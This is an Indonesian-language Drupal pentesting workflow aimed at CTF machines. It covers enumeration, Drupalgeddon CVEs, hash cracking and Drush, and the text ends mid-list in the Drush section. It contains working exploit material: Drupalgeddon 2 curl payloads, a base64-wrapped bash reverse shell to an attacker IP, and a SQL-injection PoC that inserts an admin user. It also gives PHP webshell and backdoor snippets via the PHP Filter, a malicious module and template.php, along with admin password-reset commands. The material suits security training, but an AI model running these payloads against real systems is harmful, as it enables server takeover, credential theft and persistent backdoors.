---
id: "17c"
title: "💧 File 17c: Drupal Pentesting & Exploitation Workflow"
category: "3. Web Exploitation"
categoryId: "web"
filename: "17c_Drupal_cms_workflow.md"
refs_out: ["05","06","07","12","14a","14c","17d","44"]
refs_in: ["15","17","17b","17d","62"]
---

# 💧 File 17c: Drupal Pentesting & Exploitation Workflow

Drupal adalah salah satu Content Management System (CMS) enterprise berbasis PHP yang paling sering dijumpai dalam skenario CTF (HackTheBox, TryHackMe, Proving Grounds). Arsitekturnya yang sangat bergantung pada abstraksi form (_Form API_) dan serialisasi data menjadikan Drupal rawan terhadap kerentanan eksekusi kode tingkat kritis tanpa autentikasi (_pre-auth RCE_), yang populer dengan julukan **Drupalgeddon**.

Dokumentasi ini menyajikan panduan mendalam untuk mengidentifikasi arsitektur Drupal, mengekstrak versi secara manual maupun otomatis, mengeksekusi rangkaian exploit Drupalgeddon, membongkar struktur database dan file `settings.php`, melakukan cracking terhadap hash `$S$`, hingga memanfaatkan _Drupal CLI (Drush)_ untuk eskalasi hak akses pasca-eksploitasi.

---

## 📑 Daftar Isi

1. [Bagian 1: Drupal Architecture](#-bagian-1-drupal-architecture)
2. [Bagian 2: Enumeration](#-bagian-2-enumeration)
3. [Bagian 3: Vulnerability Patterns](#-bagian-3-vulnerability-patterns)
4. [Bagian 4: Exploitation Paths](#-bagian-4-exploitation-paths)
5. [Bagian 5: Hash Cracking](#-bagian-5-hash-cracking)
6. [Bagian 6: Droopescan Workflow](#-bagian-6-droopescan-workflow)
7. [Bagian 7: DRUSH (Drupal CLI)](#-bagian-7-drush-drupal-cli)
8. [Bagian 8: Post-Exploitation](#-bagian-8-post-exploitation)
9. [Bagian 9: Automation Scripts](#-bagian-9-automation-scripts)
10. [Bagian 10: Common Errors & Troubleshooting](#-bagian-10-common-errors--troubleshooting)
11. [Bagian 11: Cheatsheet Drupal](#-bagian-11-cheatsheet-drupal)

---

## 🏗️ Bagian 1: Drupal Architecture

### 1.1 Drupal vs WordPress vs Joomla (Tabel 3-Way)

Perbandingan komprehensif antara tiga CMS utama yang paling sering muncul di CTF:

|Parameter|WordPress|Joomla|Drupal|
|---|---|---|---|
|**Config File**|`wp-config.php`|`configuration.php`|`sites/default/settings.php`|
|**Admin Panel URL**|`/wp-login.php`, `/wp-admin/`|`/administrator/`|`/user/login`, `/?q=user/login`|
|**Module / Plugin**|`/wp-content/plugins/`|`/components/`, `/modules/`|`/modules/`, `/sites/all/modules/`|
|**Theme System**|`/wp-content/themes/`|`/templates/`|`/themes/`, `/sites/all/themes/`|
|**DB Table Prefix**|`wp_`|`jos_`, `<random5>_`|Standar kosong atau `drupal_`|
|**Hash Algorithm**|Portable PHPass (`$P$` atau `$1$`)|MD5/Bcrypt/Argon2id|SHA512 custom (`$S$`)|
|**Scanner Tool**|`wpscan`|`joomscan`|`droopescan`, `CMSmap`|
|**Pola CVE Khas**|Plugin rentan, file upload liar|SQLi pada components, API leaks|Form API injection (RCE Core), REST RCE|
|**Exploit Utama**|Edit tema `404.php`, upload ZIP|Edit template `error.php`, inject agent|Pre-auth RCE (Drupalgeddon), PHP Filter|

---

### 1.2 Struktur Direktori Drupal

Memahami hierarki direktori Drupal sangat penting saat Anda mendapatkan Local File Inclusion (LFI) atau Remote Code Execution (RCE):

```text
/var/www/html/
├── core/                       # Drupal core files (Drupal 8+): logic, controller, vendor assets
├── modules/                    # Direktori modul custom / modul pihak ketiga (Drupal 8+)
├── themes/                     # Direktori tema kustom (Drupal 8+)
├── sites/                      # Direktori konfigurasi multi-site dan upload
│   ├── all/                    # Asset shared modul/tema (terutama Drupal 7)
│   │   ├── modules/            # Modul tambahan pada Drupal 7
│   │   └── themes/             # Tema tambahan pada Drupal 7
│   └── default/                # Konfigurasi instalasi target aktif
│       ├── files/              # DIRECTORY UPLOAD UTAMA (biasanya writable oleh www-data!)
│       └── settings.php        # FILE KONFIGURASI PALING KRITIS (kredensial DB & hash salt)
├── vendor/                     # Dependensi Composer (GuzzleHttp, Symfony components)
├── update.php                  # Endpoint pembaruan skema database (sering lupa diamankan)
├── install.php                 # Endpoint instalasi Drupal (sering membocorkan status/versi)
├── .htaccess                   # Konfigurasi Apache routing dan proteksi file PHP internal
├── CHANGELOG.txt               # Catatan rilis core (membocorkan versi pasti!)
└── README.txt                  # Informasi dokumentasi umum rilis Drupal
```

---

### 1.3 `settings.php` — File Paling Penting di Drupal

File `/sites/default/settings.php` berisi seluruh variabel konfigurasi environment. Jika Anda menemukan LFI atau berhasil membaca file ini lewat web shell, Anda memegang kunci database server:

```php
<?php
// Cuplikan realistis /sites/default/settings.php

$databases['default']['default'] = array (
  'database' => 'drupal_production',
  'username' => 'drupaluser',
  'password' => 'P@ssw0rdDrupalDB2023!',
  'prefix' => '',
  'host' => 'localhost',
  'port' => '3306',
  'namespace' => 'Drupal\\Core\\Database\\Driver\\mysql',
  'driver' => 'mysql',
);

// Hash salt digunakan untuk kalkulasi cookie sesi, verifikasi form tokens, dan hash hardening
$settings['hash_salt'] = 'vK8mX2a9LZ0rT4wQ8pB6yC3dF1eG5hJ7kM9nS2uV4xZ8aB0cD2eF4gH6jK8mN0p';

// Konfigurasi trusted host patterns untuk mitigasi HTTP Host Header attacks
$settings['trusted_host_patterns'] = array(
  '^drupal\.htb$',
  '^localhost$',
);

// Lokasi folder upload publik
$settings['file_public_path'] = 'sites/default/files';
```

#### Vektor Eksploitasi Setiap Field:

1. **`$databases['default']['default']`**: Kredensial MySQL/PostgreSQL. Di CTF, kredensial ini sering digunakan ulang (_password reuse_) untuk login SSH sebagai user target (misal: user `drupal`, `sysadmin`, atau `root`).
2. **`$settings['hash_salt']`**: Dibutuhkan untuk memalsukan (_forge_) sesi pengguna jika digabungkan dengan eksploitasi deserialization atau token generation.
3. **`$settings['file_public_path']`**: Menunjukkan letak folder publik writable. Sangat berguna untuk memastikan target output saat mendrop file reverse shell via exploit.

---

### 1.4 Drupal Database Structure

Drupal mengelola identitas pengguna, sesi, dan konten dalam struktur database modular.

```text
+-------------------------------------------------------+
|                 DRUPAL DATABASE MAP                   |
+-------------------------------------------------------+
|  users / users_field_data   -> Akun & Hash Password   |
|  node / node_field_data     -> Artikel / Halaman      |
|  sessions                   -> Active Cookie Sesi     |
|  system                     -> Daftar Modul & Status  |
+-------------------------------------------------------+
```

- **Drupal 7 (`users`)**:
    - Kolom: `uid`, `name`, `pass`, `mail`, `status`.
    - Akun `uid = 1` adalah _Superadministrator_ (memiliki hak akses mutlak terlepas dari konfigurasi role permission).
- **Drupal 8/9/10 (`users_field_data`)**:
    - Informasi pengguna dipindahkan dari tabel `users` ke `users_field_data`.
    - Kolom: `uid`, `langcode`, `name`, `pass`, `mail`, `status`.

#### SQL Query Esensial untuk Ekstraksi Akun Admin (via MySQL Client / SQLi):

```sql
-- Ekstraksi hash Drupal 7:
SELECT uid, name, pass, mail FROM users WHERE uid = 1;

-- Ekstraksi hash Drupal 8/9/10:
SELECT uid, name, pass, mail FROM users_field_data WHERE uid = 1;

-- Melihat seluruh modul yang sedang berstatus aktif (status = 1):
SELECT name, status, schema_version FROM system WHERE type = 'module' AND status = 1;
```

---

## 🔍 Bagian 2: Enumeration

### 2.1 Droopescan & CMSmap

#### Instalasi Tools di Parrot OS

```bash
# 1. Update package dan install dependensi Python pip
sudo apt update && sudo apt install python3-pip git -y

# 2. Install droopescan dari repository PyPI (gunakan flag --break-system-packages pada Debian modern)
sudo pip3 install droopescan --break-system-packages

# 3. Clone dan setup CMSmap
sudo git clone https://github.com/Dionach/CMSmap /opt/cmsmap
cd /opt/cmsmap
sudo pip3 install . --break-system-packages
```

#### Menjalankan Droopescan

```bash
# Full scan terhadap instalasi Drupal (deteksi versi, tema, modul)
droopescan scan drupal -u http://10.10.11.200 -t 16

# Scan dengan mode pasif dan output disimpan ke file teks
droopescan scan drupal -u http://10.10.11.200 --output /tmp/droopescan_result.txt
```

#### Menjalankan CMSmap

```bash
# CMSmap auto-detect platform (Drupal/Joomla/WordPress)
cmsmap http://10.10.11.200 -f D -F

# Scan dengan thread khusus dan output file
cmsmap http://10.10.11.200 -t 10 -o /tmp/cmsmap_report.txt
```

---

### 2.2 Manual Version Detection (SANGAT PENTING di CTF)

Di lingkungan CTF, file scanner sering kali memicu alert atau terhalang proteksi sederhana. Gunakan 7 teknik manual berikut:

#### Method A: `/CHANGELOG.txt` (Paling Reliable untuk Drupal 6 & 7)

```bash
curl -s http://10.10.11.200/CHANGELOG.txt | head -n 15
```

_Expected Output Nyata:_

```text
Drupal 7.54, 2017-02-01
-----------------------
- Fixed security issues (multiple vulnerabilities). See SA-CORE-2017-001.

Drupal 7.53, 2016-12-07
-----------------------
- Fixed security issues (multiple vulnerabilities). See SA-CORE-2016-005.
```

#### Method B: `/core/CHANGELOG.txt` (Khusus Drupal 8+)

```bash
curl -s http://10.10.11.200/core/CHANGELOG.txt | head -n 10
```

_Expected Output Nyata:_

```text
Drupal 8.5.0, 2018-03-07
------------------------
- Added support for PHP 7.2.
- Updated Symfony components to 3.4 LTS.
```

#### Method C: `/core/install.php`

```bash
curl -s http://10.10.11.200/core/install.php | grep -i "Drupal"
```

_Expected Output Nyata:_

```html
<title>Choose language | Drupal 8.4.2</title>
```

#### Method D: Meta Generator Tag dari Root Web

```bash
curl -s http://10.10.11.200 | grep -i '<meta name="generator" content="Drupal'
```

_Expected Output Nyata:_

```html
<meta name="generator" content="Drupal 7 (http://drupal.org)" />
```

#### Method E: `/README.txt`

```bash
curl -s http://10.10.11.200/README.txt | grep -i "Drupal [0-9]"
```

_Expected Output Nyata:_

```text
Drupal 8 is an open source content management platform...
```

#### Method F: `/update.php`

```bash
curl -s -I http://10.10.11.200/update.php | grep -Ei "location|drupal"
```

_Expected Output Nyata:_

```text
HTTP/1.1 403 Forbidden
X-Generator: Drupal 7 (https://www.drupal.org)
```

#### Method G: JSON:API Endpoint (`/jsonapi` pada Drupal 8+)

```bash
curl -s http://10.10.11.200/jsonapi | jq '.meta'
```

_Expected Output Nyata:_

```json
{
  "links": {
    "self": {
      "href": "http://10.10.11.200/jsonapi"
    }
  },
  "omitted": null
}
```

---

### 2.3 User Enumeration di Drupal

#### 1. Enumerasi Profil Publik via `/user/<ID>`

Drupal secara bawaan memberikan routing profil pada `/user/<ID>`. ID 1 hampir selalu adalah root/admin:

```bash
# Memeriksa user 1 (Admin)
curl -s -i http://10.10.11.200/user/1 | grep -Ei "Location:|title"
```

_Expected Output:_

```html
HTTP/1.1 301 Moved Permanently
Location: http://10.10.11.200/users/admin
```

_(Slug URL dialihkan ke username pengguna asli: `admin`)_

#### 2. Loop Enumerasi User 1 s.d. 5 via Bash

```bash
for id in {1..5}; do
  response=$(curl -s -i "http://10.10.11.200/user/$id")
  location=$(echo "$response" | grep -Ei "^Location:" | awk '{print $2}' | tr -d '\r')
  title=$(echo "$response" | grep -oP '(?<=<title>).*?(?=</title>)' | head -n 1)
  echo "[*] UID $id -> Location: ${location:-None} | Title: ${title:-None}"
done
```

#### 3. Error Disclosure pada Form Registrasi (`/user/register`)

Jika registrasi publik terbuka, input nama pengguna yang sudah ada akan memicu error spesifik:

```bash
curl -s -X POST http://10.10.11.200/user/register \
  -d "name=admin&mail=test@test.com&form_id=user_register_form&op=Create+new+account" \
  | grep -i "The name admin is already taken"
```

---

### 2.4 Module Enumeration

#### Deteksi Pasif Melalui DOM HTML Source

Modul pihak ketiga memuat file `.css` dan `.js` dari direktori modul:

```bash
# Filter path modul Drupal 7 dan 8/9
curl -s http://10.10.11.200 | grep -oP 'sites/(all|default)/modules/[a-zA-Z0-9_]+|core/modules/[a-zA-Z0-9_]+' | sort -u
```

#### Fuzzing Modul Menggunakan SecLists & `ffuf`

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/CMS/drupal-modules.txt \
     -u http://10.10.11.200/sites/all/modules/FUZZ \
     -mc 200,301,403 -t 30
```

---

## 💥 Bagian 3: Vulnerability Patterns

### 3.1 Drupalgeddon CVE Table

Tabel rujukan cepat eksploitasi core Drupal paling populer di CTF:

|CVE / Identifier|Nama Kerentanan|Versi Rentan|Vektor / Tipe|Command Exploit / Syntax|
|---|---|---|---|---|
|**CVE-2018-7600**|**Drupalgeddon 2**|6.x, 7.x < 7.58, 8.x < 8.5.1|Pre-Auth RCE (Form API)|`curl -s -k -X POST "http://TARGET/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" --data "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"`|
|**CVE-2018-7602**|**Drupalgeddon 3**|7.x < 7.59, 8.x < 8.5.2|Post-Auth RCE (Form API)|`python3 drupalgeddon3.py -u http://TARGET -c 'id' -user admin -pass password`|
|**CVE-2014-3704**|**Drupalgeddon 1**|7.0 s.d. 7.31|Pre-Auth SQLi (Database API)|`sqlmap -u "http://TARGET/?q=node&destination=node" --data="name[0; ... ]=test&pass=x&form_id=user_login_block" --dbs`|
|**CVE-2019-6340**|REST Services RCE|8.x < 8.6.10 (REST active)|Pre-Auth Deserialization RCE|`curl -X POST "http://TARGET/node?_format=hal_json" -H "Content-Type: application/hal+json" -d @guzzle_payload.json`|
|**CVE-2019-6339**|Phar Deserialization|< 7.62, < 8.6.6|File Upload / Archiving RCE|Upload file `.phar` berbahaya dengan header JPG → trigger via file stream|
|**CVE-2020-13625**|PHPMailer RCE|< 7.74, < 8.8.10, < 8.9.1|Mail parameter injection|RCE via injeksi karakter spasi pada alamat email kontak|
|**CVE-2020-28949**|PEAR Archive_Tar RCE|< 7.75, < 8.9.10, < 9.0.9|Arbitrary File Write|Upload arsip tar kompresi jahat via module update form|
|**CVE-2017-6920**|YAML Deserialization|8.0.x s.d. 8.3.3|Deserialization RCE|Exploitation via PECL YAML injection pada file config import|

---

### 3.2 Module Vulnerabilities (CTF Common)

|Module|CVE / Reference|Tipe Kerentanan|Command / Trigger URL|
|---|---|---|---|
|**RESTful Web Services**|CVE-2019-6340|Remote Code Execution|`POST /node?_format=hal_json` (Serialized Guzzle object payload)|
|**Webform**|CVE-2019-12581|Remote Code Execution|Upload form file dengan ekstensi ganda `.php.txt` atau path traversal|
|**Views**|SA-CONTRIB-2013-054|SQL Injection|Injeksi via filter sort criteria pada query parameter exposed view|
|**CKEditor**|CVE-2018-12496|XSS → Session Hijack|Injeksi malicious script pada atribut editor media embed|
|**Avatar Uploader**|CVE-2018-9205|Arbitrary File Upload|`curl -F "files[]=@shell.php" http://TARGET/sites/all/modules/avatar_uploader/lib/php/upload.php`|
|**Devel**|Misconfiguration|Remote Code Execution|Buka `/devel/php` → Eksekusi sembarang kode PHP langsung di textarea|

---

### 3.3 Authentication Issues

- **Default Credentials:** Saat deployment lokal/CTF, akun default sering berupa:
    - `admin:admin`
    - `admin:password`
    - `administrator:root`
    - `drupal:drupal`
- **User 1 Privileges:** Berbeda dengan WordPress di mana role `administrator` bisa dibatasi oleh plugin, di Drupal, akun dengan `uid = 1` bypass seluruh pengecekan hak akses internal sistem (`hook_permission`). Mendapatkan akses `uid = 1` berarti kontrol 100% atas target.

---

## 🎯 Bagian 4: Exploitation Paths

### 🗺️ Decision Tree Cepat: "Drupal Versi Berapa → Exploit Apa"

```text
DRUPAL VERSI BERAPA?
        │
        ├── 7.x < 7.32 ──────────> CVE-2014-3704 (Drupalgeddon 1) SQLi
        │                          + CVE-2018-7600 (Drupalgeddon 2) RCE
        │
        ├── 7.32 ≤ ver < 7.58 ───> CVE-2018-7600 (Drupalgeddon 2) RCE
        │                          endpoint: /?q=user/password
        │
        ├── 7.58 ≤ ver < 7.59 ───> CVE-2018-7602 (Drupalgeddon 3) RCE
        │                          butuh auth dulu
        │
        ├── 8.x < 8.5.1 ─────────> CVE-2018-7600 (Drupalgeddon 2) RCE
        │                          endpoint: /user/register
        │
        ├── 8.x < 8.6.10 ────────> CVE-2019-6340 (REST RCE)
        │                          butuh REST module aktif
        │
        └── Semua versi (jika dapat admin) → PHP Filter / Module Upload
```

---

### 4.1 Path: CVE-2018-7600 (Drupalgeddon 2) → Shell

📌 **Kapan Digunakan:**

- Ditemukan Drupal versi **7.x < 7.58** atau **8.x < 8.5.1**.
- Eksploitasi bekerja **Pre-Authentication** (tidak membutuhkan login, password, maupun CSRF token valid).

#### Flow Eksploitasi:

```text
+---------------------+      HTTP GET       +-----------------------+
|  Scan & Identifikasi| ------------------> |  Verifikasi Versi     |
|  Drupal Version     |                     |  Drupal 7.x / 8.x     |
+---------------------+                     +-----------------------+
                                                        |
                                                        v
+---------------------+     Form API RCE    +-----------------------+
|  Remote System Call | <------------------ |  Kirim Payload AJAX   |
|  (whoami / id)      |                     |  #post_render => exec |
+---------------------+                     +-----------------------+
           |
           v
+---------------------+    Reverse Shell    +-----------------------+
|  Kirim Bash Payload | ------------------> |  NC Listener / Shell  |
|  ke Mesin Attacker  |                     |  www-data Access      |
+---------------------+                     +-----------------------+
```

---

#### LANGKAH 1: Detect Versi Drupal

```bash
curl -s http://10.10.11.200/CHANGELOG.txt | head -n 3
```

_Expected Output:_

```text
Drupal 7.54, 2017-02-01
```

_(Versi 7.54 rentan karena di bawah 7.58!)_

---

#### LANGKAH 2: Safe Non-Destructive Test

Kirim command `id` menggunakan curl murni untuk memvalidasi kerentanan tanpa merusak server:

```bash
# Pengujian Drupal 7 (via password reset form)
curl -s -k -X POST "http://10.10.11.200/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id" \
  --data "form_id=user_pass&_triggering_element_name=name" | grep -o 'uid=[0-9]*(.*) gid=[0-9]*(.*)'
```

- **Jika Target Vulnerable:** Output akan mengembalikan string identitas:

```text
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```

- **Jika Target Sudah Ditambal (Patched):** Server akan mengembalikan halaman HTML normal tanpa mencetak string `uid=33`.

---

#### LANGKAH 3: Exploit via Berbagai Metode

##### Method A: Metasploit Framework

```bash
msfconsole -q
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 10.10.11.200
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set TARGETURI /
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set LHOST 10.10.14.5
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set LPORT 4444
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > exploit
```

##### Method B: Standalone PoC (Ruby / Python)

> **⚠️ PENTING: Exploit-DB 44449 adalah File Ruby (`.rb`), bukan Python!**
> File `44449.rb` dari Exploit-DB ditulis dalam bahasa Ruby sehingga tidak dapat dijalankan dengan `python3`. Gunakan salah satu opsi berikut sesuai kebutuhan:

```bash
# === Opsi 1: Eksekusi Menggunakan Ruby (Exploit-DB 44449) ===
searchsploit -m 44449
mv 44449.rb drupalgeddon2.rb
ruby drupalgeddon2.rb http://10.10.11.200

# === Opsi 2: Eksekusi Menggunakan Exploit Python Mandiri ===
# Cari exploit Python di Exploit-DB:
searchsploit drupal 7 rce 2018 | grep -i "\.py"

# Atau unduh PoC Python mandiri dari GitHub:
curl -s -o drupalgeddon2.py https://raw.githubusercontent.com/pimps/CVE-2018-7600/master/drupa17.py
python3 drupalgeddon2.py -c "id" http://10.10.11.200
```

_Expected Output:_

```text
[+] Check: Vulnerable!
[+] Output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

##### Method C: Raw curl (Memahami Mekanisme Payload)

```bash
# Penjelasan Payload:
# 1. Drupal Form API menggunakan array asosiatif dengan prefix '#' sebagai properti render.
# 2. mail[#post_render][] = "exec" -> Memerintahkan Drupal memanggil fungsi sistem exec().
# 3. mail[#type] = "markup"         -> Menandakan input adalah format elemen HTML biasa.
# 4. mail[#markup] = "id"           -> Argumen string yang akan dipasok ke exec().

curl -s -k -X POST \
  "http://10.10.11.200/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  --data "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"
```

---

#### LANGKAH 4: Eksekusi Reverse Shell & Stabilisasi TTY

1. **Jalankan Listener di Parrot OS:**

```bash
    nc -lvnp 4444
    ```

2. **Kirim Payload Reverse Shell via curl:**

```bash
    # Gunakan bash base64 encode untuk menghindari collision karakter khusus
    # Payload: bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
    ENCODED_PAYLOAD=$(echo -n "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" | base64)
    
    curl -s -k -X POST "http://10.10.11.200/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo+${ENCODED_PAYLOAD}+|+base64+-d+|+bash" \
      --data "form_id=user_pass&_triggering_element_name=name"
    ```

3. **Stabilisasi Shell Setelah Terhubung:**

```bash
    # Di dalam netcat listener:
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    # Tekan Ctrl + Z pada keyboard
    stty raw -echo; fg
    # Tekan Enter dua kali
    export TERM=xterm-256color
    ```

---

### 4.2 Path: CVE-2014-3704 (Drupalgeddon 1) → SQL Injection

📌 **Kapan Digunakan:**

- Menemukan instalasi mesin CTF retro dengan Drupal **7.x < 7.32**.
- Eksploitasi bekerja **Pre-Authentication**.

#### Flow Eksploitasi:

```text
[ Target Drupal 7.0-7.31 ] -> [ Inject SQL via login array ] -> [ Akun Admin Baru Dibuat ] -> [ Login /admin ]
```

#### Eksploitasi:

Drupal gagal mensterilkan kunci array dalam database abstraction API. Penyerang dapat menyisipkan perintah SQL untuk membuat user admin baru atau meng-update password admin.

> **💡 Catatan Kritis Mengenai Hash Drupal `$S$`:**
> Hash `$S$` pada Drupal 7 menggunakan algoritma SHA-512 dengan iterasi dan salt dinamis. Hash valid **harus di-generate oleh Drupal runtime** (`user_hash_password()`) atau tool bawaan. Tidak bisa menggunakan hash sembarang.

**Cara Menghasilkan Hash Valid atau Update Password Admin via SQL/CLI:**

```bash
# Method 1: Generate hash menggunakan PHP runtime Drupal (Paling Reliable)
php -r "
define('DRUPAL_ROOT', '/var/www/html');
require_once DRUPAL_ROOT . '/includes/password.inc';
echo user_hash_password('admin123') . PHP_EOL;
"
# Atau gunakan script CLI generator bawaan Drupal 7:
php /var/www/html/scripts/password-hash.sh admin123

# Setelah hash didapat, update password akun admin langsung di database:
mysql -u drupaluser -p'P@ssw0rdDrupalDB2023!' -e "UPDATE users SET pass='[hash_output]' WHERE name='admin';" drupal_production

# Method 2: Menggunakan Drush (Jauh lebih cepat jika ada shell):
drush user-password admin --password="admin123"
```

**PoC Injeksi SQL Akun Admin Baru (CVE-2014-3704):**

```bash
# PoC Python instan (Menyuntikkan user 'hacker' dengan password 'admin123'):
python3 -c '
import urllib.request, urllib.parse

target = "http://10.10.11.200/?q=node&destination=node"

# Hash valid Drupal 7 untuk password "admin123" (dihasilkan via user_hash_password):
pass_hash = "$S$CTvr.takt18DYBpZmiTLKCYgkRmvqZvf5/ttzkTqINmVIgnLPPoRz"

sql_payload = "name[0;insert into users (uid,name,pass,status) values (9999,\"hacker\",\"{}\",1);insert into users_roles (uid,rid) values (9999,3);#]=test&pass=x&form_id=user_login_block".format(pass_hash)

req = urllib.request.Request(target, data=sql_payload.encode(), headers={"User-Agent": "Mozilla/5.0"})
urllib.request.urlopen(req)
print("[+] User hacker:admin123 berhasil diinjeksi via SQL!")
'
```

---

### 4.3 Path: Authenticated Admin → Shell

📌 **Kapan Digunakan:**

- Berhasil mendapatkan kredensial admin dari SQLi, cracking hash, atau default credentials.
- **Prasyarat:** Cookie sesi admin aktif atau kredensial username & password.

---

#### Method 1: Mengaktifkan Modul PHP Filter (Drupal 7)

Modul native `PHP Filter` memungkinkan evaluasi kode PHP langsung di body konten:

1. Akses modul panel: `http://10.10.11.200/?q=admin/modules`.
2. Scroll ke bawah, cari modul **PHP filter**, centang kotak enable.
3. Klik tombol **Save configuration** di bagian bawah.
4. Buka menu konten: `http://10.10.11.200/?q=node/add/page`.
5. Tulis payload di bagian _Body_:

```php
    <?php system($_GET['cmd']); ?>
    ```

6. Pada dropdown **Text format**, ubah dari _Filtered HTML_ menjadi **PHP code**.
7. Klik **Save**.
8. Trigger shell: `http://10.10.11.200/?q=node/1&cmd=id`.

---

#### Method 2: Upload Malicious Module (Drupal 7 & 8)

1. Buat direktori modul lokal:

```bash
    mkdir /tmp/evilmodule && cd /tmp/evilmodule
    
    # Buat manifest .info
    cat << 'EOF' > evilmodule.info
    name = Evil Module
    description = Pentest Module
    core = 7.x
    package = Custom
    version = 1.0
    files[] = evilmodule.module
    EOF
    
    # Buat script payload .module
    cat << 'EOF' > evilmodule.module
    <?php
    if (isset($_GET['shell'])) {
        system($_GET['shell']);
        exit;
    }
    ?>
    EOF
    
    # Arsipkan menjadi tar.gz
    tar -czvf /tmp/evilmodule.tar.gz evilmodule.info evilmodule.module
    ```

2. Buka URL: `http://10.10.11.200/?q=admin/modules/install`.
3. Unggah file `/tmp/evilmodule.tar.gz`.
4. Trigger RCE: `http://10.10.11.200/sites/all/modules/evilmodule/evilmodule.module?shell=id`.

---

#### Method 3: Template.php Modification (Theme Editor)

Jika memiliki hak akses file management atau instalasi modul editor:

1. Buka file `/themes/bartik/template.php`.
2. Sisipkan fungsi backdoor:

```php
    function bartik_preprocess_page(&$variables) {
        if(isset($_GET['c'])){ system($_GET['c']); }
    }
    ```

3. Refresh halaman home: `http://10.10.11.200/?c=whoami`.

---

### 4.4 Path: Hash Cracking → Admin Access → Shell

📌 **Kapan Digunakan:**

- Berhasil mengekstrak hash `$S$` dari database atau backup `settings.php`.

```text
[ Dump Hash $S$ ] -> [ Hashcat Mode 7900 ] -> [ Cleartext Password ] -> [ Login /user/login ] -> [ Admin to Shell ]
```

1. Ekstrak string hash dari tabel database (`users` atau `users_field_data`).
2. Jalankan Hashcat mode `7900` untuk memecahkan password.
3. Login ke portal `/user/login`.
4. Lakukan Method 1 (PHP Filter) atau Method 2 (Module Upload) untuk memperoleh reverse shell.

---

## 🔑 Bagian 5: Hash Cracking

### 5.1 Drupal Password Hash Format

Drupal (sejak versi 7 hingga versi 9/10) menggunakan algoritma hashing kustom berbasis SHA-512 dengan salt dan iterasi dinamis (_Drupal 7 hash standard_). Format hash selalu diawali dengan prefix `$S$`.

- **Struktur Hash:**
    `$S$ [Iteration Count: 1 char] [Salt: 8 chars] [SHA-512 Hash: 43 chars]`
- **Contoh Hash Nyata:**
    `$S$D2DA1g79/O2aGf0.eY2p8EeVwB5.t7Jb7R2g4m9jL6t3w1q8y9s`
    _(Password dari hash ini adalah: `admin123`)_

```bash
# Validasi format hash menggunakan hash-identifier
hash-identifier
# Masukkan hash $S$... -> Terdeteksi: Drupal7
```

---

### 5.2 Cracking Commands

#### Menggunakan Hashcat (Mode 7900)

Mode resmi Hashcat untuk Drupal 7/8/9 adalah **7900**.

```bash
# Simpan hash ke file teks
echo '$S$D2DA1g79/O2aGf0.eY2p8EeVwB5.t7Jb7R2g4m9jL6t3w1q8y9s' > /tmp/drupal_hash.txt

# 1. Cracking standar menggunakan RockYou
hashcat -m 7900 -a 0 /tmp/drupal_hash.txt /usr/share/wordlists/rockyou.txt

# 2. Cracking menggunakan mutator rules (Best64)
hashcat -m 7900 -a 0 /tmp/drupal_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 3. Menampilkan password yang berhasil di-crack
hashcat -m 7900 --show /tmp/drupal_hash.txt
```

#### Menggunakan John the Ripper

```bash
# Cracking via John (format otomatis mengenali drupal7)
john --format=drupal7 /tmp/drupal_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Menampilkan hasil cracking
john --show --format=drupal7 /tmp/drupal_hash.txt
```

---

## ⚙️ Bagian 6: Droopescan Workflow

Droopescan adalah scanner plugin-based khusus yang dirancang untuk mengidentifikasi modul, file sensitif, dan versi Drupal melalui perbandingan checksum file statis.

```bash
# 1. Menampilkan opsi bantuan dan tipe scan
droopescan scan --help

# 2. Full Standard Scan
droopescan scan drupal -u http://10.10.11.200

# 3. Scan spesifik tanpa memeriksa tema (Mempercepat enumerasi modul)
droopescan scan drupal -u http://10.10.11.200 --number 500 --hide-progressbar
```

#### Cara Membaca Output dan Prioritas Aksi:

```text
[+] Possible version(s):
    7.54
    7.55
    7.56
[+] Plugins found:
    views http://10.10.11.200/sites/all/modules/views/
    ctools http://10.10.11.200/sites/all/modules/ctools/
```

1. **Prioritas 1:** Bandingkan versi yang teridentifikasi (`7.54 - 7.56`) dengan tabel Drupalgeddon. (Versi di bawah 7.58 → langsung jalankan exploit Drupalgeddon 2).
2. **Prioritas 2:** Periksa folder modul yang ditemukan (`/sites/all/modules/views/`) untuk mencari file `CHANGELOG.txt` atau `README.txt` lokal guna mencari versi modul yang rentan SQLi.

---

## 💻 Bagian 7: DRUSH (Drupal CLI)

Jika Anda berhasil mendapatkan shell awal (misalnya via reverse shell `www-data`), periksa apakah **Drush** (Drupal Shell CLI) terpasang di server. Drush adalah utility administratif paling ampuh di server Drupal.

### 7.1 Memeriksa Ketersediaan Drush

```bash
which drush
find / -name drush 2>/dev/null
drush status
```

---

### 7.2 Drush Commands Esensial untuk Attacker

Jalankan perintah ini **di dalam direktori web root** (`/var/www/html`):

```bash
# 1. RESET PASSWORD ADMIN SECARA INSTAN! (Paling sering dipakai di CTF!)
drush user-password admin --password="NewPwnedPassword2023!"

# 2. Ekstraksi Informasi Lengkap User Admin
drush user-information admin

# 3. Eksekusi Kueri SQL Langsung ke Database Internal
drush sql-query "SELECT uid, name, mail FROM users;"

# 4. Aktifkan Modul PHP Filter Secara Paksa (Bypass GUI!)
drush pm-enable php -y

# 5. Buat Akun Superadmin Baru Langsung dari Command Line
